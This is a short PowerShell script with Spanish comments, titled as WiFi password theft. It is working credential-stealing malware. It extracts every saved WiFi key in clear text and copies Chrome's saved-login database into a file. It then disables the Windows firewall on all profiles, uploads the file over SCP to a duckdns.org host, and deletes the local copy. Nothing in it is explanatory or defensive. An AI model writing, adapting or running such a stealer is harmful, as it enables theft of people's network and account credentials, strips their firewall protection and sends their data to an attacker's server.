## Robo de contraseñas wifi
$lul = pwd
$WifiSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
$WifiInfo = foreach($SSID in $WifiSSIDs) {
$Contraseña = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Contenido de la clave') -replace ".*:\s+"
New-Object -TypeName psobject -Property @{"Contraseña"=$Contraseña;"SSID"=$SSID}
}$WifiInfo | ConvertTo-Json | Out-File lel.txt
## Espaciador

"##########################################################################################################################################3" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"PASSWORDS" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"#####################################" >> lel.txt
"##########################################################################################################################################3" >> lel.txt

## Robo de contraseñas y datos de inicio de sesion de Google Chrome
$lol= whoami
$juas= $lol.split("\")[1]
Get-Content "C:\Users\$juas\AppData\Local\Google\Chrome\User Data\Default\Login Data" >> lel.txt

## Deshabilita el firewall
netsh advfirewall set allprofiles state off

## Conexion remota con server (subida del archivo con datos robados)
Set-SCPFile –ComputerName dominio.duckdns.org –Port 3333  –RemotePath /home/usuario/Wordpress/wp-content/uploads/2019 –LocalFile $lul/lel.txt

## Borrado del archivo
rm $lul/lel.
